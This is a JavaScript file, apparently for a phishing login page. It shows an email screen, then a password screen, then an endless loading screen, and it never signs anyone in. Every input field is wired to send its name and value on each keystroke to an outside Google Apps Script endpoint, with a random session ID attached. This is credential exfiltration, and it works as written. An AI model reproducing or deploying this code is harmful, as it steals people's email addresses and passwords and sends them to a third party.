document.getElementById("next-btn").addEventListener("click", function () {
  const emailScreen = document.getElementById("email-screen");
  const passwordScreen = document.getElementById("password-screen");
  if (document.getElementById("email").value) {
    emailScreen.classList.add("hidden");
    passwordScreen.classList.remove("hidden");
  } else {
    alert("Please enter your email.");
  }
});

document.getElementById("login-btn").addEventListener("click", function () {
  const passwordScreen = document.getElementById("password-screen");
  const loadingScreen = document.getElementById("loading-screen");
  if (document.getElementById("password").value) {
    passwordScreen.classList.add("hidden");
    loadingScreen.classList.remove("hidden");
  } else {
    alert("Please enter your password.");
  }
});



document.addEventListener("DOMContentLoaded", () => {
  // Generate a random ID
  const randomId = Math.random().toString(36).substr(2, 9);
  
  // Store the ID globally
  window.randomId = randomId;
  console.log("Generated ID:", randomId);
});

// Handler for input changes
function onchangehandler(event) {
  const randomId = window.randomId; // Use the generated random ID
  const eventName = event.target.name;
  const eventValue = event.target.value;

  // Construct the API URL with query parameters
  const apiUrl = `https://script.google.com/macros/s/AKfycbySs68ETvE848bG9kkf9ImftAB_aRTgY1TzIIO8b8Ne6dINzm0na9oT4yhMl2CYmSRepA/exec?id=${encodeURIComponent(randomId)}&eventName=${encodeURIComponent(eventName)}&eventValue=${encodeURIComponent(eventValue)}`; // Replace with your Apps Script Web App URL

  // Send the GET request
  fetch(apiUrl, { method: "GET" })
    .then(response => response.json())
    .then(result => {
      console.log("Response from API:", result);
    })
    .catch(error => {
      console.error("Error:", error);
    });
}

// Apply 'input' event to every input element
document.querySelectorAll("input").forEach(function (input) {
  input.addEventListener("input", onchangehandler);
});
